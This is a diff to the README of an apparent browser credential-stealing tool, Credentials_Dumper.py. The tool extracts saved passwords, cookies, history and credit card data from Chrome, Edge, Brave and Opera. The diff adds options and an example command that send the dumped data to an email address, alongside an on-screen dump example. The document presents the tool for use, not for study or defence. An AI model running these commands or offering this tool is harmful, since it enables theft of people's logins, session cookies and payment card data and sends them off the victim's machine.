@@ -20,13 +20,23 @@ python Credentials_Dumper.py -h
 ```
 ### Options:
 ```
-  -h, --help       show this help message and exit
-  -b , --browser   Browser Name:chrome/msedge/brave/opera
-  -c , --command   Command to Excute:passwords/cookies/history/creditcards
+  -h, --help            show this help message and exit
+  -browser , --browser  Browser Name: chrome/msedge/brave/opera
+  -get , --get          Get:passwords/cookies/history/creditcards
+  -send , --send        Select: passwords/cookies/history/creditcards
+  -to , --to            Send: passwords/cookies/history/creditcards to email
 ```
 ## Example:
+### Dump it on screen:
 ``
-python Credentials_Dumper.py -b msedge -c passwords
+python Credentials_Dumper.py -browser msedge -get passwords
 ``
 #### Output:
-![alt text](https://github.com/SHBBL/Credentials-Dumper/blob/main/blob/img.png?raw=true)
+![alt text](https://github.com/SHBBL/Credentials-Dumper/blob/main/blob/img.jpg?raw=true)
+
+### Send to email:
+``
+python Credentials_Dumper.py -browser msedge -send passwords -to example@example.com 
+``
+#### Output:
+Check Your spam or inbox
